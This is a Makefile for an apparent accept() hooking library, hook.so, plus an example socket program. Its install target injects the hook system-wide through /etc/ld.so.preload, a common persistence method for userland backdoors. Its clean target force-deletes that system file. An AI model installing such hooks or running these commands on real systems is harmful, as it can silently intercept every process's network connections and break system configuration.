CC=gcc
#DEBUG=-ggdb -g

hook.so: accept_hook.c
	$(shell sh find_libc.sh)
	$(CC) $(DEBUG) -Wall -shared -fPIC -ldl -o hook.so accept_hook.c

example_sock: example.c
	$(CC) $(DEBUG) -o example_sock example.c

all: hook.so example_sock
	echo "Run with LD_PRELOAD=$(PWD)/hook.so ./example_sock"

clean:
	rm -rf hook.so example_sock defines.h
	rm -rf /etc/ld.so.preload
	rm -rf /lib64/hook.so

install: hook.so
	mv hook.so /lib64/hook.so
	echo /lib64/hook.so > /etc/ld.so.preload
